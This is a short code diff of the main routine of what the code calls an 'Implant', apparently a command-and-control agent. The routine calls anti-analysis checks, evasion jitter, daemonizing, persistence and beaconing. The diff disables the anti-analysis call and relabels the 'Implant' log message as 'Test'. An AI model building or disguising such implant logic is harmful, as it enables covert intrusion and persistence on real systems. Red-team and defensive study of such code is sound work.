@@ -76,7 +76,7 @@ int main(int argc, char** argv) {
     }
 
     // 2. Anti-analysis checks
-    AntiAnalysis();
+    //AntiAnalysis();
 
     // 3. Optional initial jitter (skipped in CI)
     int jitter = evasion::Detection::GetJitterDelay();
@@ -87,7 +87,7 @@ int main(int argc, char** argv) {
     // 4. Daemonize
     Daemonize();
 
-    LOG_INFO("Implant starting...");
+    LOG_INFO("Test starting...");
 
     // 5. Setup Persistence and start beaconing
     persistence::establishPersistence();
